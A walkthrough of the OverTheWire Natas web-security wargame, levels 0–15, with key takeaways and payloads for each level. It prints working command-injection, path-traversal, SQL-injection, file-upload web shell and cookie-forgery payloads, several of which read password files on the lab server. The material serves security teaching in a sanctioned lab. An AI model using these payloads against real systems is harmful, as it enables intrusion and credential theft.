# 📘 OverTheWire Natas Walkthrough (Levels 0–15)

## Overview

The **OverTheWire Natas** challenges are a web security wargame designed to teach **real-world web vulnerabilities** through hands-on exploitation.

Each level introduces a new concept, starting from simple HTML inspection and progressing to:

* Authentication bypass
* Cookie manipulation
* File inclusion & traversal
* Command injection
* Weak cryptography
* File upload exploitation
* SQL Injection (including Blind SQLi)

This repository documents **Natas Levels 0–15** with concise explanations, attack logic, and automation where applicable.

> This is a **multi-part series**. Some later levels deserve dedicated deep-dives.

```
OverTheWire-Wargames-Walkthrough/Natas
```

## 🧩 Level-wise Walkthrough

---

## Natas Level 0 → Level 1

**Key Takeaway:**
Passwords are often exposed in **HTML source code**.

**Procedure:**

* View page source (`Ctrl + U`)
* Locate password embedded in HTML comments

---

## Natas Level 1 → Level 2

**Key Takeaway:**
Client-side restrictions (like disabling right-click) are meaningless.

**Procedure:**

* Use `Ctrl + U` to view source
* Extract password from HTML

---

## Natas Level 2 → Level 3

**Key Takeaway:**
Sensitive data may exist in **linked resources**, not the main page.

**Procedure:**

* Inspect page source
* Discover `/files/` directory
* Open linked image / files
* Extract password from metadata or content

---

## Natas Level 3 → Level 4

**Key Takeaway:**
`robots.txt` can expose **hidden directories**.

**Procedure:**

* Visit `/robots.txt`
* Find disallowed directory `/s3cr3t/`
* Open `users.txt`
* Extract password

---

## Natas Level 4 → Level 5

**Key Takeaway:**
**HTTP Referer headers are not secure**.

**Procedure:**

* Modify `Referer` header using:

  * `curl`
  * Burp Suite
* Spoof allowed referer
* Retrieve password from response

```bash
curl -u natas4:<password> \
--referer "http://natas5.natas.labs.overthewire.org/" \
http://natas4.natas.labs.overthewire.org/
```

---

## Natas Level 5 → Level 6

**Key Takeaway:**
Cookies can be **manipulated client-side**.

**Procedure:**

* Open DevTools → Application → Cookies
* Change:

  ```
  loggedin=0 → loggedin=1
  ```
* Reload page
* Password revealed

---

## Natas Level 6 → Level 7

**Key Takeaway:**
**Insecure file inclusion** leaks secrets.

**Procedure:**

* View source
* Notice:

  ```php
  include("includes/secret.inc");
  ```
* Directly access:

  ```
  /includes/secret.inc
  ```
* Use secret to retrieve password

---

## Natas Level 7 → Level 8

**Key Takeaway:**
**Directory Traversal** enables arbitrary file access.

**Procedure:**

* Hint reveals password location:

  ```
  /etc/natas_webpass/natas8
  ```
* Use payload:

  ```
  ?page=/etc/natas_webpass/natas8
  ```

---

## Natas Level 8 → Level 9

**Key Takeaway:**
Weak encoding ≠ encryption.

**Observed Encoding:**

```
bin2hex(strrev(base64_encode($secret)))
```

**Reverse Logic:**

```php
<?php
echo base64_decode(strrev(hex2bin($encoded)));
?>
```

---

## Natas Level 9 → Level 10

**Key Takeaway:**
**Command Injection** via unsanitized input.

**Vulnerable Code:**

```php
passthru("grep -i $key dictionary.txt");
```

**Exploit Payload:**

```
a; cat /etc/natas_webpass/natas10
```

---

## Natas Level 10 → Level 11

**Key Takeaway:**
Blacklists are fragile.

**Filter Blocks:** `; & |`
**Bypass Payload:**

```
a /etc/natas_webpass/natas11
```

---

## Natas Level 11 → Level 12

**Key Takeaway:**
**XOR encryption + cookies = reversible**

**Attack Flow:**

1. Decode cookie
2. Identify repeating XOR key (`eDWo`)
3. Flip:

   ```json
   "showpassword":"no" → "yes"
   ```
4. Re-encode + replace cookie
5. Password revealed

---

## Natas Level 12 → Level 13

**Key Takeaway:**
**Insecure file upload** → Remote Code Execution

**Procedure:**

* Upload PHP disguised as image
* Modify `.jpg` → `.php` in HTML
* Access uploaded file
* Execute:

```php
<?php require "/etc/natas_webpass/natas13"; ?>
```

---

## Natas Level 13 → Level 14

**Key Takeaway:**
MIME checks can be bypassed with **valid headers**.

**JPEG + PHP Payload:**

```bash
echo -e "\xFF\xD8\xFF\xE0<?php require '/etc/natas_webpass/natas14'; ?>" > shell.php
```

---

## Natas Level 14 → Level 15

**Key Takeaway:**
Classic **SQL Injection**.

**Vulnerable Query:**

```sql
SELECT * FROM users WHERE username="..." AND password="..."
```

**Payload:**

```
Username: " or ""="
Password: " or ""="
```

---

## Natas Level 15 → Level 16

**Key Takeaway:**
**Blind SQL Injection** via boolean inference.

**Payload Example:**

```sql
natas16" AND SUBSTRING(password,1,1)="a" #
```
